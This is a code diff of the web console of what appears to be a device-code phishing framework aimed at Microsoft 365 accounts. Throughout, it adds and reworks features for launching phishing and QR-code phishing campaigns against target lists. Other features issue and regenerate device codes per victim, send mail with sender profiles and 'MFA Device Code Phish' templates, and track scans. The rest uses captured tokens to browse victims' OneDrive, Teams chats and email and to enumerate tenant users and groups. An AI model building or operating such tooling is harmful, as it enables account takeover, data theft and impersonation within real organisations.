+            <div id="teamsListBody" style="overflow-y:auto;flex:1"><div style="padding:14px;font-size:11px;color:var(--text-dim)">Load teams or chats above</div></div>
+          </div>
+          <!-- Messages panel -->
+          <div class="teams-messages-panel">
+            <div class="teams-msg-header">
+              <span id="teamsConvLabel">Select a team channel or chat</span>
+              <button class="btn btn-sm" id="teamsRefreshBtn" onclick="teamsRefreshMessages()" style="display:none">↻</button>
+            </div>
+            <div class="teams-msg-list" id="teamsMsgList"><div style="padding:20px;font-size:11px;color:var(--text-dim);text-align:center">No conversation selected</div></div>
+            <div class="teams-send-area" id="teamsSendArea" style="display:none">
+              <textarea id="teamsMsgInput" placeholder="Type a message..." rows="1" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();teamsSend();}"></textarea>
+              <button class="btn btn-sm btn-primary" style="margin-bottom:0;white-space:nowrap" onclick="teamsSend()">↑ Send</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ── FILES TAB ── -->
+      <div id="tab-files" class="tab-content">
+        <div class="tab-target-bar">
+          <label>TARGET</label>
+          <select id="filesTargetSelect"><option value="">— select captured target —</option></select>
+          <button class="btn btn-sm btn-primary" onclick="filesOpen('root','OneDrive')">📁 Browse Drive</button>
+          <button class="btn btn-sm" onclick="filesLoadRecent()">⏱ Recent</button>
+          <input type="text" id="filesSearchQ" placeholder="Search files...">
+          <button class="btn btn-sm" onclick="filesSearch()">🔍</button>
+          <label class="btn btn-sm btn-success" style="cursor:pointer;margin-bottom:0">
+            ↑ Upload
+            <input type="file" id="filesUploadInput" style="display:none" onchange="filesUpload(this)">
+          </label>
+        </div>
+        <div id="filesOutput" style="background:var(--bg2);border:1px solid var(--border);border-radius:2px;padding:16px;min-height:200px;overflow-x:auto">
+          <span style="color:var(--text-dim)">Select a target and browse or search files</span>
+        </div>
+      </div>
+
+      <!-- ── USERS TAB ── -->
+      <div id="tab-users" class="tab-content">
+        <div class="tab-target-bar">
+          <label>TARGET</label>
+          <select id="usersTargetSelect"><option value="">— select captured target —</option></select>
+          <button class="btn btn-sm btn-primary" onclick="usersLoad()">Load Users &amp; Groups</button>
+        </div>
+        <div class="users-layout" id="usersLayout">
+          <!-- Users section -->
+          <div>
+            <div class="section-header">Users</div>
+            <div class="filter-bar">
+              <div class="filter-bar-row">
+                <div class="search-wrap">
+                  <input type="text" id="usersFilter" placeholder="Search users..." oninput="usersApplyFilter()">
+                </div>
+                <span id="usersCount" style="font-size:10px;color:var(--text-dim);white-space:nowrap"></span>
+              </div>
+              <div class="filter-chips">
+                <span class="filter-chip-label">Fields:</span>
+                <button class="filter-chip active" data-field="displayName" onclick="toggleFilterChip(this,'users')">Name</button>
+                <button class="filter-chip active" data-field="mail" onclick="toggleFilterChip(this,'users')">Email</button>
+                <button class="filter-chip active" data-field="department" onclick="toggleFilterChip(this,'users')">Dept</button>
+                <button class="filter-chip active" data-field="jobTitle" onclick="toggleFilterChip(this,'users')">Title</button>
+                <button class="filter-chip" data-field="userPrincipalName" onclick="toggleFilterChip(this,'users')">UPN</button>
+                <button class="filter-chip" data-field="officeLocation" onclick="toggleFilterChip(this,'users')">Office</button>
+                <button class="filter-chip" data-field="accountEnabled" onclick="toggleFilterChip(this,'users')">Enabled</button>
+              </div>
+            </div>
+            <div class="table-wrap" id="usersTableWrap">
+              <div style="padding:20px;text-align:center;color:var(--text-dim);font-size:11px">No users loaded yet</div>
+            </div>
+            <div id="usersPager" class="pager"></div>
+          </div>
+          <!-- Groups section -->
+          <div>
+            <div class="section-header">Groups</div>
+            <div class="filter-bar">
+              <div class="filter-bar-row">
+                <div class="search-wrap">
+                  <input type="text" id="groupsFilter" placeholder="Search groups..." oninput="groupsApplyFilter()">
+                </div>
+                <span id="groupsCount" style="font-size:10px;color:var(--text-dim);white-space:nowrap"></span>
+              </div>
+              <div class="filter-chips">
+                <span class="filter-chip-label">Fields:</span>
+                <button class="filter-chip active" data-field="displayName" onclick="toggleFilterChip(this,'groups')">Name</button>
+                <button class="filter-chip active" data-field="description" onclick="toggleFilterChip(this,'groups')">Description</button>
+                <button class="filter-chip active" data-field="mail" onclick="toggleFilterChip(this,'groups')">Mail</button>
+                <button class="filter-chip" data-field="groupType" onclick="toggleFilterChip(this,'groups')">Type</button>
+                <button class="filter-chip" data-field="id" onclick="toggleFilterChip(this,'groups')">ID</button>
+              </div>
+            </div>
+            <div class="table-wrap" id="groupsTableWrap">
+              <div style="padding:20px;text-align:center;color:var(--text-dim);font-size:11px">No groups loaded yet</div>
+            </div>
+            <div id="groupsPager" class="pager"></div>
+          </div>
+        </div>
+        <!-- Detail panels -->
+        <div id="userDetailPanel" class="detail-panel" style="display:none"></div>
+        <div id="groupDetailPanel" class="detail-panel" style="display:none"></div>
+      </div>
+
     </div>
 
-    <!-- Webhook listener view -->
-    <div id="webhookView" style="display:none">
-      <div class="section-header">Telemetry / Webhook Listener</div>
 
-      <div style="display:grid;grid-template-columns:320px 1fr;gap:24px;align-items:start">
+  </div>
+</div>
 
-        <!-- Control panel -->
-        <div class="config-card">
-          <div class="config-card-title">Listener Control</div>
-
-          <div style="display:flex;align-items:center;gap:10px;margin-bottom:16px">
-            <div id="webhookDot" style="width:10px;height:10px;border-radius:50%;background:var(--text-dim);flex-shrink:0"></div>
-            <span id="webhookStatusLabel" style="font-size:11px;color:var(--text-dim)">STOPPED</span>
-          </div>
-
-          <div class="input-group">
-            <label>Listen Port</label>
-            <input type="number" id="webhookPort" value="8080" min="1" max="65535" placeholder="8080">
-          </div>
-
-          <div style="display:flex;gap:8px;margin-top:4px">
-            <button class="btn btn-success btn-sm" id="webhookStartBtn" onclick="webhookStart()" style="flex:1">▶ Start</button>
-            <button class="btn btn-danger btn-sm" id="webhookStopBtn" onclick="webhookStop()" style="flex:1" disabled>■ Stop</button>
-          </div>
-
-          <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border)">
-            <div style="font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-dim);margin-bottom:8px">Info</div>
-            <div style="font-size:11px;color:var(--text-dim);line-height:1.8">
-              Endpoint: <span style="color:var(--accent)" id="webhookEndpoint">—</span><br>
-              Path: <span style="color:var(--text)">any (/<wbr>receive, /<wbr>capture, ...)</span><br>
-              Method: <span style="color:var(--text)">POST</span><br>
-              Content-Type: <span style="color:var(--text)">application/json</span><br>
-              Total received: <span style="color:var(--accent3)" id="webhookTotal">0</span>
-            </div>
-          </div>
-
-          <div style="margin-top:16px;padding-top:12px;border-top:1px solid var(--border)">
-            <button class="btn btn-sm" onclick="webhookRefreshLogs()" style="width:100%;margin-bottom:6px">↻ Refresh Logs</button>
-            <button class="btn btn-sm" onclick="webhookClearView()" style="width:100%">✕ Clear View</button>
-          </div>
-        </div>
-
-        <!-- Log viewer -->
-        <div>
-          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-            <span style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim)">Received Payloads <span id="webhookEntryCount" style="color:var(--accent)">(0)</span></span>
-            <span style="font-size:10px;color:var(--text-dim)" id="webhookLastRefresh"></span>
-          </div>
-          <div id="webhookLog" style="background:var(--bg2);border:1px solid var(--border);border-radius:2px;overflow-y:auto;max-height:calc(100vh - 220px);font-size:11px;font-family:var(--mono)">
-            <div style="padding:24px;text-align:center;color:var(--text-dim)" id="webhookEmpty">No entries yet. Start the listener and send a POST to /receive.</div>
-          </div>
-        </div>
-
-      </div>
-
-      <hr class="divider">
-      <button class="btn btn-sm" onclick="showCampaignViewOrEmpty()" style="width:auto">← Back to Campaign</button>
+<!-- ── Compose Email Modal ── -->
+<div id="composeModal" class="modal-overlay" style="display:none">
+  <div class="modal-box">
+    <div class="modal-header">
+      <span class="modal-header-title">New Email</span>
+      <button class="modal-close" onclick="document.getElementById('composeModal').style.display='none'">✕</button>
     </div>
-
-    <!-- Mail config view -->
-    <div id="mailConfigView" style="display:none">
-      <div class="section-header">Mail Configuration</div>
-
-      <div class="tabs">
-        <button class="tab active" onclick="switchMailTab('profiles', this)">Sender Profiles</button>
-        <button class="tab" onclick="switchMailTab('templates', this)">Email Templates</button>
+    <div class="modal-body">
+      <div class="input-group"><label>To (comma separated)</label><input type="text" id="composeTo"></div>
+      <div class="input-group"><label>Subject</label><input type="text" id="composeSubject"></div>
+      <div class="input-group"><label>Body (HTML)</label><textarea id="composeBody" style="min-height:120px"></textarea></div>
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <button class="btn btn-primary btn-sm" onclick="mailSendCompose()" style="flex:1">Send</button>
+        <button class="btn btn-sm" onclick="document.getElementById('composeModal').style.display='none'" style="flex:1">Cancel</button>
       </div>
-
-      <!-- Profiles tab -->
-      <div id="mailtab-profiles" class="tab-content active">
-        <div class="config-grid">
-          <!-- Left: existing profiles -->
-          <div>
-            <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px">Saved Profiles</div>
-            <div class="item-list" id="profileList">
-              <div style="color:var(--text-dim);font-size:11px">No profiles yet</div>
-            </div>
-            <button class="btn btn-sm" onclick="newProfileForm()">+ New Profile</button>
-          </div>
-          <!-- Right: form -->
-          <div id="profileFormWrap">
-            <div class="config-card">
-              <div class="config-card-title">Sender Profile</div>
-              <div class="input-group">
-                <label>Profile Name</label>
-                <input type="text" id="profName" placeholder="Office365 Phish Account">
-              </div>
-              <div class="input-row">
-                <div class="input-group">
-                  <label>SMTP Host</label>
-                  <input type="text" id="profHost" placeholder="smtp.office365.com">
-                </div>
-                <div class="input-group" style="max-width:90px">
-                  <label>Port</label>
-                  <input type="number" id="profPort" value="587">
-                </div>
-              </div>
-              <div class="input-group">
-                <label>Username</label>
-                <input type="text" id="profUser" placeholder="phish@yourdomain.com">
-              </div>
-              <div class="input-group">
-                <label>Password</label>
-                <input type="password" id="profPass" placeholder="••••••••••••">
-              </div>
-              <div class="input-group">
-                <label>From Name</label>
-                <input type="text" id="profFromName" placeholder="IT Security Team">
-              </div>
-              <div class="input-group">
-                <label>From Address</label>
-                <input type="text" id="profFromAddr" placeholder="security@yourdomain.com">
-              </div>
-              <div class="checkbox-group">
-                <input type="checkbox" id="profImplicitTLS">
-                <label for="profImplicitTLS">Implicit TLS (port 465 / SMTPS) — uncheck for STARTTLS/587</label>
-              </div>
-              <div style="display:flex;gap:8px;margin-top:4px">
-                <button class="btn btn-primary btn-sm" onclick="saveProfile()" style="flex:1">Save Profile</button>
-                <button class="btn btn-sm" onclick="testProfile()" style="flex:1">Test Send</button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <!-- Templates tab -->
-      <div id="mailtab-templates" class="tab-content">
-        <div class="config-grid">
-          <!-- Left: template list -->
-          <div>
-            <div style="font-size:10px;letter-spacing:0.15em;text-transform:uppercase;color:var(--text-dim);margin-bottom:12px">Saved Templates</div>
-            <div class="item-list" id="templateList">
-              <div style="color:var(--text-dim);font-size:11px">No templates yet</div>
-            </div>
-            <button class="btn btn-sm" onclick="newTemplateForm()">+ New Template</button>
-          </div>
-          <!-- Right: editor -->
-          <div>
-            <div class="config-card">
-              <div class="config-card-title" style="display:flex;justify-content:space-between;align-items:center">
-                <span>Email Template</span>
-                <label class="btn btn-sm" style="cursor:pointer;margin-bottom:0">
-                  ↑ Upload HTML
-                  <input type="file" accept=".html,.htm" style="display:none" onchange="uploadHTMLTemplate(this)">
-                </label>
-              </div>
-              <div class="input-group">
-                <label>Template Name</label>
-                <input type="text" id="tmplName" placeholder="MFA Device Code Phish">
-              </div>
-              <div class="input-group">
-                <label>Subject</label>
-                <input type="text" id="tmplSubject" placeholder="Action Required: Verify your device">
-              </div>
-
-              <div class="input-group">
-                <label>Redirector URL <span style="color:var(--text-dim);font-weight:normal">(optional — if set, {{URL}} resolves to this instead of the real Microsoft URL)</span></label>
-                <input type="text" id="tmplRedirector" placeholder="https://r.yourdomain.com/go">
-              </div>
-
-              <div class="input-group">
-                <label>HTML Body</label>
-                <div class="template-editor">
-                  <div class="editor-toolbar">
-                    <span>Insert:</span>
-                    <span class="var-chip" onclick="insertVar('tmplHTML','{{DCODE}}')">{{DCODE}}</span>
-                    <span class="var-chip" onclick="insertVar('tmplHTML','{{URL}}')">{{URL}}</span>
-                    <span class="var-chip" onclick="insertVar('tmplHTML','{{REALURL}}')">{{REALURL}}</span>
-                    <span class="var-chip" onclick="insertVar('tmplHTML','{{EMAIL}}')">{{EMAIL}}</span>
-                    <span class="var-chip" onclick="insertVar('tmplHTML','{{NAME}}')">{{NAME}}</span>
-                  </div>
-                  <textarea class="code-editor" id="tmplHTML" placeholder="<p>Hello {{NAME}},</p>
-<p>Please verify your device by visiting <a href=&quot;{{URL}}&quot;>{{URL}}</a> and entering the code:</p>
-<h2>{{DCODE}}</h2>"></textarea>
-                </div>
-                <div class="hint">{{DCODE}} = user code &nbsp;|&nbsp; {{URL}} = redirector URL (or real URL if no redirector set) &nbsp;|&nbsp; {{REALURL}} = real Microsoft URL &nbsp;|&nbsp; {{EMAIL}} = target email &nbsp;|&nbsp; {{NAME}} = display name</div>
-              </div>
-
-              <div class="input-group">
-                <label>Plain Text Body (optional fallback)</label>
-                <textarea id="tmplText" style="min-height:80px" placeholder="Plain text version for email clients that don't render HTML..."></textarea>
-              </div>
-
-              <div style="display:flex;gap:8px;margin-top:4px">
-                <button class="btn btn-primary btn-sm" onclick="saveTemplate()" style="flex:1">Save Template</button>
-                <button class="btn btn-sm" onclick="previewTemplate()" style="flex:1">Preview</button>
-              </div>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <hr class="divider">
-      <button class="btn btn-sm" onclick="showCampaignViewOrEmpty()" style="width:auto">← Back to Campaign</button>
     </div>
+  </div>
+</div>
 
+<!-- ── Reply Modal ── -->
+<div id="replyModal" class="modal-overlay" style="display:none">
+  <div class="modal-box">
+    <div class="modal-header">
+      <span class="modal-header-title" id="replyModalTitle">Reply</span>
+      <button class="modal-close" onclick="document.getElementById('replyModal').style.display='none'">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="input-group" id="forwardToWrap" style="display:none"><label>To (comma separated)</label><input type="text" id="forwardTo"></div>
+      <div class="input-group"><label>Comment</label><textarea id="replyComment" style="min-height:80px" placeholder="Your reply..."></textarea></div>
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <button class="btn btn-primary btn-sm" onclick="mailDoReplyForward()" style="flex:1">Send</button>
+        <button class="btn btn-sm" onclick="document.getElementById('replyModal').style.display='none'" style="flex:1">Cancel</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ── New Chat Modal ── -->
+<div id="newChatModal" class="modal-overlay" style="display:none">
+  <div class="modal-box">
+    <div class="modal-header">
+      <span class="modal-header-title">New Chat</span>
+      <button class="modal-close" onclick="document.getElementById('newChatModal').style.display='none'">✕</button>
+    </div>
+    <div class="modal-body">
+      <div class="input-group"><label>Member User IDs (comma separated)</label><input type="text" id="newChatMembers" placeholder="user-id-1, user-id-2"></div>
+      <div class="input-group">
+        <label>Chat Type</label>
+        <select id="newChatType"><option value="oneOnOne">One on One</option><option value="group">Group</option></select>
+      </div>
+      <div style="display:flex;gap:8px;margin-top:8px">
+        <button class="btn btn-primary btn-sm" onclick="teamsCreateChat()" style="flex:1">Create</button>
+        <button class="btn btn-sm" onclick="document.getElementById('newChatModal').style.display='none'" style="flex:1">Cancel</button>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -1086,9 +1379,14 @@
 let activeCampaignID = null;
 let eventSource = null;
 let tokensSeen = new Set();
-let editingProfileID = null;
-let editingTemplateID = null;
 let graphLastResult = null;
+
+// Pagination state
+const PAGE_SIZE = 25;
+let sessionsPage = 1;  let sessionsAll = [];
+let tokensPage = 1;    let tokensAll = [];
+let targetsPage = 1;   let targetsAll = [];
+let emailResultsPage = 1; let emailResultsAll = [];
 
 // ─── Notification ────────────────────────────────────────────────────────────
 function notify(msg, error=false) {
@@ -1100,38 +1398,95 @@ function notify(msg, error=false) {
   setTimeout(() => el.style.display = 'none', 4000);
 }
 
+// ─── Error messages ───────────────────────────────────────────────────────────
+function friendlyError(msg) {
+  if (!msg) return 'Unknown error';
+  const m = String(msg);
+  if (m.includes('AADSTS70000')) return 'Token revoked — re-capture required. MFA may have been newly enforced on this tenant.';
+  if (m.includes('AADSTS700082')) return 'Refresh token expired — re-capture required.';
+  if (m.includes('AADSTS50076') || m.includes('AADSTS50079')) return 'MFA required — complete MFA authentication via Advanced Tools.';
+  if (m.includes('AADSTS53003')) return 'Access blocked by a Conditional Access policy.';
+  if (m.includes('AADSTS65001')) return 'App consent required — user has not granted permissions.';
+  if (m.includes('AADSTS50034')) return 'User not found in this tenant.';
+  if (m.includes('AADSTS50126')) return 'Authentication failed — invalid credentials.';
+  if (/AADSTS\d+/.test(m)) return 'Azure AD error ' + (m.match(/AADSTS\d+/)?.[0] || '') + ' — check token validity.';
+  if (m.includes('no captured token') || m.includes('no token')) return 'No captured token — complete the device code flow first.';
+  if (m.includes('campaign not found')) return 'Campaign not found — it may have been deleted.';
+  if (m.includes('target not found')) return 'Target not found in this campaign.';
+  if (m.includes('unauthorized')) return 'Session expired — please log in again.';
+  if (m.includes('forbidden') || m.includes('403')) return 'Access denied — insufficient permissions.';
+  if (m.length > 140) return m.substring(0, 140) + '…';
+  return m;
+}
+
+// ─── Auth ─────────────────────────────────────────────────────────────────────
+// Session is managed server-side. Any 401 means the session expired — redirect
+// to /login so the server can re-authenticate and set a new session cookie.
+function showLoginOverlay() {
+  window.location.href = '/login?next=' + encodeURIComponent(window.location.pathname + window.location.search);
+}
+
+async function doLogout() {
+  await fetch('/api/auth/logout', { method: 'POST', credentials: 'same-origin' });
+  activeCampaignID = null;
+  if (eventSource) { eventSource.close(); eventSource = null; }
+  window.location.href = '/login';
+}
+
 // ─── API helper ──────────────────────────────────────────────────────────────
 async function api(method, path, body) {
   const opts = { method, headers: {'Content-Type': 'application/json'} };
   if (body !== undefined) opts.body = JSON.stringify(body);
   try {
     const r = await fetch('/api' + path, opts);
-    return await r.json();
+    if (r.status === 401) { showLoginOverlay(); return { error: 'Session expired — please log in again.' }; }
+    if (r.status === 403) return { error: 'Access denied — insufficient permissions for this operation.' };
+    if (r.status === 404) return { error: 'Resource not found.' };
+    if (!r.ok && r.status >= 500) return { error: 'Server error — check operator logs.' };
+    const data = await r.json();
+    if (data && data.error) data.error = friendlyError(data.error);
+    return data;
   } catch(e) {
+    if (e.message && (e.message.includes('Failed to fetch') || e.message.includes('NetworkError')))
+      return { error: 'Network error — server unreachable.' };
     return { error: e.message };
   }
+}
+
+// Raw fetch that returns the Response object (for file downloads, etc.)
+async function apiFetch(path, opts={}) {
+  const r = await fetch('/api' + path, opts);
+  if (r.status === 401) { showLoginOverlay(); return null; }
+  return r;
+}
+
+// ─── Pagination helpers ───────────────────────────────────────────────────────
+function paginate(all, page) {
+  const total = all.length;
+  const totalPages = Math.max(1, Math.ceil(total / PAGE_SIZE));
+  const p = Math.min(Math.max(1, page), totalPages);
+  return { items: all.slice((p-1)*PAGE_SIZE, p*PAGE_SIZE), page: p, totalPages, total };
+}
+
+function renderPager(containerId, page, totalPages, total, prevFn, nextFn) {
+  const el = document.getElementById(containerId);
+  if (!el) return;
+  if (totalPages <= 1) { el.innerHTML = ''; return; }
+  el.innerHTML = `
+    <button class="btn btn-sm" ${page<=1?'disabled':''} onclick="${prevFn}()">&larr; Prev</button>
+    <span class="pager-info">Page ${page} / ${totalPages} &mdash; ${total} records</span>
+    <button class="btn btn-sm" ${page>=totalPages?'disabled':''} onclick="${nextFn}()">Next &rarr;</button>
+  `;
 }
 
 // ─── View management ─────────────────────────────────────────────────────────
 function showView(name) {
   document.getElementById('emptyState').style.display = name === 'empty' ? 'block' : 'none';
   document.getElementById('campaignView').style.display = name === 'campaign' ? 'block' : 'none';
-  document.getElementById('mailConfigView').style.display = name === 'mail' ? 'block' : 'none';
-  document.getElementById('webhookView').style.display = name === 'webhook' ? 'block' : 'none';
-  if (name !== 'webhook' && webhookPollTimer) {
-    clearInterval(webhookPollTimer);
-    webhookPollTimer = null;
-  }
 }
 
 function showCampaignViewOrEmpty() {
   showView(activeCampaignID ? 'campaign' : 'empty');
-}
-
-function showMailConfig() {
-  showView('mail');
-  loadProfiles();
-  loadTemplates();
 }
 
 // ─── Campaigns ───────────────────────────────────────────────────────────────
@@ -1150,10 +1505,47 @@ async function createCampaign() {
 
 async function launchCampaign() {
   if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  // Smart launch: server only starts device codes for targets that don't have one active
   const result = await api('POST', '/campaigns/' + activeCampaignID + '/launch');
   if (result.error) { notify(result.error, true); return; }
-  notify('Campaign launched — polling started for all targets');
+  const msg = result.skipped > 0
+    ? `Campaign launched — ${result.started || 'all'} targets started, ${result.skipped} already active`
+    : 'Campaign launched — polling started for all targets';
+  notify(msg);
   startEventStream();
+}
+
+async function launchForTarget(targetId, email) {
+  if (!activeCampaignID) return;
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/targets/' + encodeURIComponent(targetId) + '/launch');
+  if (result.error) { notify('Launch failed for ' + email + ': ' + result.error, true); return; }
+  notify('Device code started for ' + email);
+  startEventStream();
+}
+
+async function regenCode(targetId, email, btn) {
+  if (!activeCampaignID) return;
+  btn.disabled = true; btn.textContent = '…';
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/targets/' + encodeURIComponent(targetId) + '/regen');
+  btn.disabled = false; btn.textContent = '↻';
+  if (result.error) { notify('Regen failed for ' + email + ': ' + result.error, true); return; }
+  notify('New code issued for ' + email);
+}
+
+async function regenAll() {
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/regen-all');
+  if (result.error) { notify(result.error, true); return; }
+  notify('Regenerated ' + (result.regenerated || 0) + ' codes' + (result.errors?.length ? ', ' + result.errors.length + ' errors' : ''));
+}
+
+async function deleteTarget(targetId, email) {
+  if (!activeCampaignID) return;
+  if (!confirm('Remove "' + email + '" from this campaign?\nThis will delete their device codes, tokens, and email records.')) return;
+  const result = await api('DELETE', '/campaigns/' + activeCampaignID + '/targets/' + encodeURIComponent(targetId));
+  if (result.error) { notify('Delete failed: ' + result.error, true); return; }
+  notify('Removed ' + email + ' from campaign');
+  loadTargets();
 }
 
 async function stopCampaign() {
@@ -1174,9 +1566,9 @@ async function selectCampaign(id) {
 function renderCampaignList(camps) {
   const el = document.getElementById('campaignList');
   el.innerHTML = camps.map(c => `
-    <div style="padding:8px;border:1px solid var(--border);border-radius:2px;margin-bottom:6px;cursor:pointer${activeCampaignID===c.id?';border-color:var(--accent)':''}" onclick="selectCampaign('${c.id}')">
-      <div style="color:var(--accent);font-size:11px">${c.name || c.id}</div>
-      <div style="color:var(--text-dim);font-size:10px">${c.status || 'draft'}</div>
+    <div data-camp-id="${escH(c.id)}" style="padding:8px;border:1px solid var(--border);border-radius:2px;margin-bottom:6px;cursor:pointer${activeCampaignID===c.id?';border-color:var(--accent)':''}" onclick="selectCampaign('${escH(c.id)}')">
+      <div style="color:var(--accent);font-size:11px">${escH(c.name || c.id)}</div>
+      <div class="camp-status" style="color:var(--text-dim);font-size:10px">${c.status || 'draft'}</div>
     </div>
   `).join('');
 }
@@ -1218,21 +1610,40 @@ async function loadTargets() {
   const targets = await api('GET', '/campaigns/' + activeCampaignID + '/targets');
   if (!Array.isArray(targets)) return;
   document.getElementById('statTargets').textContent = targets.length;
+  targetsAll = targets;
+  targetsSetPage(1);
+}
+
+function targetsSetPage(p) {
+  targetsPage = p;
+  const { items, page, totalPages, total } = paginate(targetsAll, p);
   const body = document.getElementById('targetsBody');
-  if (targets.length === 0) {
-    body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>';
+  if (items.length === 0) {
+    body.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:32px;color:var(--text-dim)">No targets imported</td></tr>';
+    document.getElementById('targetsPager').innerHTML = '';
     return;
   }
-  body.innerHTML = targets.map(t => `
-    <tr>
-      <td style="color:var(--accent)">${t.email}</td>
-      <td>${t.display_name || '—'}</td>
-      <td>${t.department || '—'}</td>
-      <td>${t.region || '—'}</td>
-      <td>${t.group || '—'}</td>
-    </tr>
-  `).join('');
+  const cid = activeCampaignID;
+  body.innerHTML = items.map(t => {
+    const tid = escH(t.id);
+    const email = escH(t.email);
+    return `<tr>
+      <td style="color:var(--accent)">${email}</td>
+      <td>${escH(t.display_name || '—')}</td>
+      <td>${escH(t.department || '—')}</td>
+      <td>${escH(t.region || '—')}</td>
+      <td>${escH(t.group || '—')}</td>
+      <td style="text-align:right;white-space:nowrap">
+        <button class="btn btn-sm btn-success" style="padding:3px 8px;margin-bottom:0" title="Start device code for this user" onclick="launchForTarget('${tid}','${email}')">▶</button>
+        <button class="btn btn-sm btn-warn" style="padding:3px 8px;margin-bottom:0" title="Regenerate device code" onclick="regenCode('${tid}','${email}',this)">↻</button>
+        <button class="btn btn-sm btn-danger" style="padding:3px 8px;margin-bottom:0" title="Remove from campaign" onclick="deleteTarget('${tid}','${email}')">✕</button>
+      </td>
+    </tr>`;
+  }).join('');
+  renderPager('targetsPager', page, totalPages, total, 'targetsPrev', 'targetsNext');
 }
+function targetsPrev() { targetsSetPage(targetsPage - 1); }
+function targetsNext() { targetsSetPage(targetsPage + 1); }
 
 // ─── Phishing email dispatch ──────────────────────────────────────────────────
 async function sendPhishingEmails() {
@@ -1255,23 +1666,114 @@ async function sendPhishingEmails() {
   loadEmailResults();
 }
 
+// ─── Per-target email send ─────────────────────────────────────────────────────
+async function sendEmailToSession(targetId, email, btn) {
+  const profileID = document.getElementById('selectedProfile').value;
+  const templateID = document.getElementById('selectedTemplate').value;
+  if (!profileID) { notify('Select a sender profile in the sidebar first', true); return; }
+  if (!templateID) { notify('Select an email template in the sidebar first', true); return; }
+  if (!activeCampaignID) return;
+  const orig = btn.textContent;
+  btn.disabled = true; btn.textContent = '…';
+  const res = await api('POST', `/campaigns/${activeCampaignID}/targets/${encodeURIComponent(targetId)}/send-email`, {
+    profile_id: profileID, template_id: templateID
+  });
+  btn.disabled = false; btn.textContent = orig;
+  if (res.error) { notify('Send failed for ' + email + ': ' + res.error, true); return; }
+  notify(res.success ? '✉ Email sent to ' + email : '⚠ Failed: ' + (res.error || 'unknown'));
+}
+
+// ─── QR Phishing ───────────────────────────────────────────────────────────────
+// sendQREmails()                         — send to all targets (sidebar button)
+// sendQREmails(targetId, email, btn)     — send to one target (per-row button)
+async function sendQREmails(targetId, email, btn) {
+  const profileID = document.getElementById('selectedProfile').value;
+  const qrTmpl = document.getElementById('qrTemplate').value;
+  const dcTmpl = document.getElementById('qrDcTemplate').value;
+  const baseURL = document.getElementById('qrBaseUrl').value.trim();
+  if (!activeCampaignID) { notify('Select a campaign first', true); return; }
+  if (!profileID) { notify('Select a sender profile first', true); return; }
+  if (!qrTmpl) { notify('Select a QR email template first', true); return; }
+  if (!dcTmpl) { notify('Select a DC email template first', true); return; }
+  if (!baseURL) { notify('Enter the public base URL first', true); return; }
+
+  if (btn) { btn.disabled = true; btn.textContent = '…'; }
+  const body = { profile_id: profileID, qr_template_id: qrTmpl, dc_template_id: dcTmpl, base_url: baseURL };
+  if (targetId) body.target_id = targetId;
+
+  const result = await api('POST', '/campaigns/' + activeCampaignID + '/qr-emails', body);
+  if (btn) { btn.disabled = false; btn.textContent = '⬛'; }
+  if (result.error) { notify(result.error, true); return; }
+
+  const results = result.results || [];
+  const ok = results.filter(r => r.success).length;
+  const fail = results.length - ok;
+  if (targetId && email) {
+    const res = results[0];
+    notify(res && res.success ? 'QR email sent to ' + email : 'QR send failed for ' + email + ': ' + (res?.error || 'unknown'), !(res && res.success));
+  } else {
+    notify('QR emails: ' + ok + ' sent' + (fail ? ', ' + fail + ' failed' : ''));
+  }
+  loadQRScans();
+}
+
+async function loadQRScans() {
+  if (!activeCampaignID) return;
+  const scans = await api('GET', '/campaigns/' + activeCampaignID + '/qr-scans');
+  const body = document.getElementById('qrScansBody');
+  if (!body) return;
+  if (!Array.isArray(scans) || scans.length === 0) {
+    body.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:24px;color:var(--text-dim)">No QR scans yet</td></tr>';
+    return;
+  }
+  body.innerHTML = scans.map(s => {
+    const scanned = s.scanned_at
+      ? `<span style="color:var(--accent3)">${new Date(s.scanned_at).toLocaleString()}</span>`
+      : '<span style="color:var(--text-dim)">Not yet</span>';
+    const count = (s.scan_count > 0)
+      ? `<span style="color:var(--accent3);font-weight:600">${s.scan_count}</span>`
+      : '<span style="color:var(--text-dim)">0</span>';
+    const dcSent = s.dc_sent ? '<span style="color:var(--accent3)">✓ Sent</span>' : '<span style="color:var(--text-dim)">Pending</span>';
+    return `<tr>
+      <td style="color:var(--text-bright)">${escH(s.target_email)}</td>
+      <td style="color:var(--text-dim)">${new Date(s.created_at).toLocaleString()}</td>
+      <td>${scanned}</td>
+      <td style="text-align:center">${count}</td>
+      <td>${dcSent}</td>
+      <td style="font-size:10px;color:var(--text-dim);font-family:var(--mono)">${escH(s.token)}</td>
+    </tr>`;
+  }).join('');
+}
+
 async function loadEmailResults() {
   if (!activeCampaignID) return;
   const results = await api('GET', '/campaigns/' + activeCampaignID + '/email-results');
+  if (!Array.isArray(results)) return;
+  emailResultsAll = results;
+  emailResultsSetPage(1);
+}
+
+function emailResultsSetPage(p) {
+  emailResultsPage = p;
+  const { items, page, totalPages, total } = paginate(emailResultsAll, p);
   const body = document.getElementById('emailResultsBody');
-  if (!Array.isArray(results) || results.length === 0) {
+  if (items.length === 0) {
